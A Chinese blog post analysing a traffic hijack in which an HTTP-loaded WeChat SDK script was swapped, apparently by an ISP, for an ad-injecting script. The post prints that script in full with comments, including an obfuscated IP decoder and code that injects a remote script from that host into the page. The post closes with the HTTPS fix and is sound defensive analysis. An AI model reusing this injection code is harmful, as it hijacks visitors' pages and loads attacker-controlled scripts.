---
Title: 记一次流量劫持
Tags: 编码
PublishDate: 2018/9/17 15:15
---

又是填队友坑，拿到代码本地启动后发现神奇的一幕，页面被劫持插入了广告，弹出几秒钟后消失。

![jc0](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8cuxcsj30bf037dgb.jpg)

让我来看看这是咋回事，因为某个微信 sdk 使用了 http，该 JS 脚本的响应结果被篡改替换了。

![jc2](http://wx3.sinaimg.cn/large/007113CZgy1fvcl8i86ugj30kq01dwei.jpg)

![jc3](http://wx4.sinaimg.cn/large/007113CZgy1fvcl8ncohpj31370ia0va.jpg)

**http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 该请求因为使用了 http 给了流量劫持可乘之机，未能返回正确的脚本内容，而是返回了一个被精心构造的恶意脚本。

简单分析下这个恶意脚本做了啥，我们 http 请求 **http://res.wx.qq.com/open/js/jweixin-1.2.0.js** 的响应结果被劫持替换成了下面的脚本，这个脚本又再次构造请求带上标识符去拿到真实的内容，同时将自己的恶意脚本注入到页面上。


```javascript
!function(e, t, n, o, r, i, a, c) {
    // 这里有意思了，之后后会发现变量 c 的结果是一个 IP 地址
    // "124.232.160.178"
    // 这个 IP 地址加上拼凑的字符串变成了 http://124.232.160.178/v1/a/?u=0 
    // 通过 insertBefore 注入了恶意脚本
    c = function(e, t, n) {
        for (t = e % 256,
        n = 3; 0 < n; n--)
            t = (e = Math.floor(e / 256)) % 256 + "." + t;
        return t
    }(2095620274),
    (a = function(e) {
        r = t.createElement(n),
        i = t.getElementsByTagName(n)[0],
        r.src = "//" + e,
        i.parentNode.insertBefore(r, i)
    }
    // 这儿有点意思，似乎是为了避免重复劫持，
    // 通过时间戳和标识符再次请求我们需要的脚本，
    // 这次返回的是真实未被篡改的脚本内容
    )(o + (0 < o.indexOf("?") ? "&" : "?") + "_t" + (new Date).getTime() + "=0i"),
    // 注入恶意脚本 http://124.232.160.178/v1/a/?u=0 
    a(c + "/v1/a/?u=0")
}(window, document, "script", "res.wx.qq.com/open/js/jweixin-1.2.0.js");
```

所以解决问题的办法就是把页面上的 http 替换成 https 或是把资源放到本地存储。

顺手查一下这个 IP 地址的信息发现了一些有意思的事情，看样子是运营商的锅了，这回是哪个临时工背锅呢？

![jc4](http://wx1.sinaimg.cn/large/007113CZgy1fvcl8rf54hj30fu057glv.jpg)

![jcyys](http://wx1.sinaimg.cn/mw690/007113CZgy1fvcl8y06f5j30kf0l7417.jpg)